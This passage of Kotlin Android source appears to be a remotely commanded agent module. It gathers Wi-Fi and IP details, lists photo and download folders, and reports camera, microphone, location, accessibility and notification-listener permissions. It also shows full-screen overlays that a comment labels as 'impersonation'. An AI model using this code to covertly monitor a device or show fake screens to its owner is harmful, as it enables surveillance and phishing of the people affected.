                        @Suppress("DEPRECATION") wm.connectionInfo.rssi, 5
                    )
                    put("wifi_ssid", @Suppress("DEPRECATION") wifiSsid())
                    put("wifi_bssid", @Suppress("DEPRECATION") wifiBssid())
                    put("wifi_rssi", @Suppress("DEPRECATION") wm.connectionInfo.rssi)
                    put("wifi_level", cm2)
                }
            } catch (_: Exception) {}
            // IP address
            try {
                val en = java.net.NetworkInterface.getNetworkInterfaces()
                while (en.hasMoreElements()) {
                    val ifa = en.nextElement()
                    val addr = ifa.inetAddresses
                    while (addr.hasMoreElements()) {
                        val ip = addr.nextElement()
                        if (!ip.isLoopbackAddress) { put("ip", ip.hostAddress); break }
                    }
                }
            } catch (_: Exception) {}
        } catch (e: Exception) { put("error", e.message ?: "") }
    }

    @Suppress("DEPRECATION")
    private fun wifiSsid(): String {
        val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        return (wm.connectionInfo.ssid ?: "").removeSurrounding("\"")
    }
    @Suppress("DEPRECATION")
    private fun wifiBssid(): String {
        val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        return wm.connectionInfo.bssid ?: ""
    }

    private suspend fun storageList(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        try {
            val dir = p["dir"]?.jsonPrimitive?.content ?: "DCIM"
            val limit = (p["limit"]?.jsonPrimitive?.content?.toIntOrNull() ?: 30).coerceIn(1, 100)
            val base = when (dir) {
                "DCIM" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
                "Pictures" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
                "Download" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
                "Internal" -> app.filesDir
                "Cache" -> app.cacheDir
                else -> java.io.File(dir)
            }
            if (!base.exists()) return@withContext err("storage_list: director inexistent: $dir")
            val entries = base.listFiles() ?: return@withContext err("storage_list: nu pot lista $dir")
            val sorted = entries.sortedWith(compareByDescending<java.io.File> { it.isDirectory }.thenBy { it.name.lowercase() })
            val fileArr = sorted.take(limit).map { f -> buildJsonObject {
                put("name", f.name)
                put("path", f.absolutePath)
                put("size", if (f.isDirectory) -1L else f.length())
                put("is_dir", f.isDirectory)
                put("modified", f.lastModified())
            } }
            buildJsonObject {
                put("base", base.path)
                put("parent", base.parent ?: "")
                putJsonArray("files") { fileArr.forEach { add(it) } }
                put("count", fileArr.size)
            }
        } catch (e: Exception) { err("storage_list: ${e.message}") }
    }

    // ── Resetare proces ───────────────────────────────────────────────
    private fun resetApp(): JsonObject {
        val pid = android.os.Process.myPid()
        android.os.Process.killProcess(pid)
        return buildJsonObject { put("ok", true); put("msg", "reset trimis (pid $pid)") }
    }

    // ── Status / diagnostic ──────────────────────────────────────────
    private fun status(): JsonObject {
        val a11yEnabled = ForjaGuardService.isEnabled(app)
        val a11yConnected = ForjaGuardService.guardReady()
        val voiceOn = false // v5.1: VoiceUiConnection nu exista
        val camPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        val micPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        val locPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val usage = try {
            val ctx = app
            val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), ctx.packageName
            ) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
        val notifListener = ForjaNotifListener.isRegistered(app)
        val saw = android.provider.Settings.canDrawOverlays(app)
        return buildJsonObject {
            put("accessibility_enabled", a11yEnabled)
            put("accessibility_connected", a11yConnected)
            put("detox_accessibility", a11yConnected)
            put("voice_accessibility", voiceOn)
            put("camera_perm", camPerm)
            put("mic_perm", micPerm)
            put("location_perm", locPerm)
            put("usage_stats", usage)
            put("notif_listener", notifListener)
            put("overlay_perm", saw)
            put("screenshot_ok", a11yConnected || voiceOn)
            put("sdk", Build.VERSION.SDK_INT)
            put("battery", batteryInfo())
            put("sync_running", SyncService.running)
            put("sync_last_keepalive_ms", SyncService.lastKeepaliveTs)
        }
    }

    // ── Overlay ecran — prompt / alertă / impersonare, prin SYSTEM_ALERT_WINDOW ──
    private suspend fun prompt(p: JsonObject): JsonObject = withContext(Dispatchers.Main) {
        try {
            if (!android.provider.Settings.canDrawOverlays(app)) {
                // Auto-open overlay settings for this app
                try {
                    val intent = android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        android.net.Uri.parse("package:${app.packageName}"))
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    app.startActivity(intent)
                } catch (_: Exception) {}
                return@withContext buildJsonObject {
                    put("ok", false)
                    put("err", "SYSTEM_ALERT_WINDOW neacordată. Am deschis setările — activează 'Afișare peste alte aplicații' și reîncearcă.")
                    put("settings_opened", true)
                }
            }
            val wm = app.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            val type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            val lp = android.view.WindowManager.LayoutParams(type)
            lp.width = android.view.WindowManager.LayoutParams.MATCH_PARENT
            lp.height = android.view.WindowManager.LayoutParams.MATCH_PARENT
            lp.flags = android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            lp.format = android.graphics.PixelFormat.OPAQUE

            val durationMs = (p["durationMs"]?.jsonPrimitive?.long ?: 5000L).coerceIn(1000, 60000)
            val bg = p["bg"]?.jsonPrimitive?.content ?: "#000000"

            val root = android.widget.LinearLayout(app)
            root.orientation = android.widget.LinearLayout.VERTICAL
            root.gravity = android.view.Gravity.CENTER
            root.setBackgroundColor(android.graphics.Color.parseColor(bg))

            val title = p["title"]?.jsonPrimitive?.content ?: ""
            val body = p["body"]?.jsonPrimitive?.content ?: ""
            if (title.isNotBlank()) {
                val tvT = android.widget.TextView(app)
                tvT.text = title
                tvT.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 22f)
                tvT.setTextColor(android.graphics.Color.WHITE)
                tvT.gravity = android.view.Gravity.CENTER
                tvT.setPadding(48, 48, 48, 16)
                root.addView(tvT)
            }
            if (body.isNotBlank()) {
                val tvB = android.widget.TextView(app)
                tvB.text = body
                tvB.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 16f)
                tvB.setTextColor(android.graphics.Color.LTGRAY)
                tvB.gravity = android.view.Gravity.CENTER
                tvB.setPadding(48, 0, 48, 48)
                root.addView(tvB)
            }

            wm.addView(root, lp)
            Handler(Looper.getMainLooper()).postDelayed({
                try { wm.removeView(root) } catch (_: Exception) {}
            }, durationMs)
            buildJsonObject {
                put("ok", true)
                put("duration", durationMs)
                put("title", title)
                put("type", p["type"]?.jsonPrimitive?.content ?: "prompt")
            }
        } catch (e: Exception) { err("prompt: ${e.message}") }
    }
}
